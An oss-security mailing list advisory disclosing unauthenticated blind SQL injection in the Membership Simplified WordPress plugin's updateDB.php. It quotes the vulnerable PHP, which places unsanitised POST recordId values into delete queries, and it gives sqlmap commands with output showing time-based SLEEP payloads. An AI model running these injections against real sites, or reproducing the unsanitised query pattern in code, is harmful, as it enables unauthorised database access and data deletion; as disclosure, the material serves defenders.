  oss-security - Multiple Unauthenticated blind SQL injections in Wordpress Plugin  Membership Simplified            Products  Openwall GNU/*/Linux   server OS Linux Kernel Runtime Guard John the Ripper   password cracker  Free & Open Source for any platform in the cloud Pro for Linux Pro for macOS  Wordlists   for password cracking passwdqc   policy enforcement  Free & Open Source for Unix Pro for Windows (Active Directory)  yescrypt   KDF & password hashing yespower   Proof-of-Work (PoW) crypt_blowfish   password hashing phpass   ditto in PHP tcb   better password shadowing Pluggable Authentication Modules scanlogd   port scan detector popa3d   tiny POP3 daemon blists   web interface to mailing lists msulogin   single user mode login php_mt_seed   mt_rand() cracker  Services Publications  Articles Presentations  Resources  Mailing lists Community wiki Source code repositories (GitHub) Source code repositories (CVSweb) File archive & mirrors How to verify digital signatures OVE IDs  What's new         Follow @Openwall on Twitter for new release announcements and other news   [<prev] [next>] [day] [month] [year] [list]  Date: Wed, 22 Mar From: "Larry W. Cashdollar" <larry0@...com> To: Open Source Security <oss-security@...ts.openwall.com> Subject: Multiple Unauthenticated blind SQL injections in Wordpress Plugin  Membership Simplified  Title: Multiple Unauthenticated blind SQL injections in Wordpress Plugin Membership Simplified Author: Larry W. Cashdollar, @_larry0 Date: Download Site: http://membership.officeautopilot.com/get-it-now/ Vendor: http://membership.officeautopilot.com/ Vendor Notified: Vendor Contact: Advisory: Description: Membership Simplified allows you to generate membership lessons with templated content to create a unified look and feel throughout your courses. Vulnerability: The code in membership-simplified-for-oap-members-only/updateDB.php is vulnerable to blind SQL injection because it doesn't sanitize user input via any of the POST requests being passed into the SQL query.  Also it doesn't check that a user is authorized to make updates to the database.    2 require_once("../../../wp-config.php");   3 global $wpdb;   4 $table_name = $wpdb->prefix . "download_listing";   5 $media_table_name = $wpdb->prefix . "media_listing";   6 $action = $_POST['action'];   7 $updateRecordsArray = $_POST['recordsArray'];   8 $mediaupdateRecordsArray = $_POST['mediaRecordsArray'];  I chose to test the SQL injection against the delete action as it was the most straightforward injection point.   34 if($action == 'delete') {  35         $upload_base_dir = wp_upload_dir();  36         $upload_dir =  $upload_base_dir['basedir'];  37         $path= $upload_dir.'/membership-simplified-for-oap-members-only/';  38         $fileName = $wpdb->get_row("select fileName from $table_name where recordId= ".$_POST['recordId']."");  39         @unlink($path.$fileName->fileName);  40         $query= "delete from $table_name where recordId= '".$_POST['recordId']."' ";  41         $wpdb->query($query) or die('Error, insert query failed');  42   43 }    56 if($action == 'delete_media') {  57         $upload_base_dir = wp_upload_dir();  58         $upload_dir = $upload_base_dir['basedir'];  59         $path = $upload_dir.'/membership-simplified-for-oap-members-only/';  60         $fileName = $wpdb->get_row("select fileName from $media_table_name where recordId= ".$_POST['recordId']."");  61         //@...ink($path.$fileName->fileName);  62         $query= "delete from $media_table_name where recordId= '".$_POST['recordID']."' ";  65         $wpdb->query($query) or die($query);  Exploit Code: 	• $ sqlmap -u 'http://example.com/wordpress/wp-content/plugins/membership-simplified-for-oap-members-only/updateDB.php' --data 'action=delete&recordId=*' --dbms mysql  --level 3 --risk 3 	•   	• (custom) POST parameter '#1*' is vulnerable. Do you want to keep testing the others (if any)? [y/N]  	• sqlmap identified the following injection point(s) with a total of HTTP(s) requests: 	• --- 	• Parameter: #1* ((custom) POST) 	•     Type: AND/OR time-based blind 	•     Title: MySQL >= time-based blind - Parameter replace (substraction) 	•     Payload: action=delete&recordId=(SELECT * FROM (SELECT(SLEEP(5)))uxVZ) 	• --- 	• [INFO] the back-end DBMS is MySQL 	• web server operating system: Linux Ubuntu (xenial) 	• web application technology: Apache 	• back-end DBMS: MySQL >= 	• [INFO] fetched data logged to text files under '/home/larry/.sqlmap/output/example.com' 	•   	• [*] shutting down at 	•   	•   	• $ sqlmap -u 'http://example.com/wordpress/wp-content/plugins/membership-simplified-for-oap-members-only/updateDB.php' --data 'action=delete_media&recordId=*' --dbms mysql  --level 3 --risk 3 	•   	• sqlmap identified the following injection point(s) with a total of HTTP(s) requests: 	• --- 	• Parameter: #1* ((custom) POST) 	•     Type: AND/OR time-based blind 	•     Title: MySQL >= time-based blind - Parameter replace (substraction) 	•     Payload: action=delete_media&recordId=(SELECT * FROM (SELECT(SLEEP(5)))ENgw) 	• --- 	• [INFO] the back-end DBMS is MySQL 	• web server operating system: Linux Ubuntu (xenial) 	• web application technology: Apache 	• back-end DBMS: MySQL >= 	• [INFO] fetched data logged to text files under '/home/larry/.sqlmap/output/example.com' 	•   	• [*] shutting down at Powered by blists - more mailing lists  Please check out the  Open Source Software Security Wiki, which is counterpart to this mailing list.  Confused about mailing lists and their use? Read about mailing lists on Wikipedia and check out these guidelines on proper formatting of your messages.      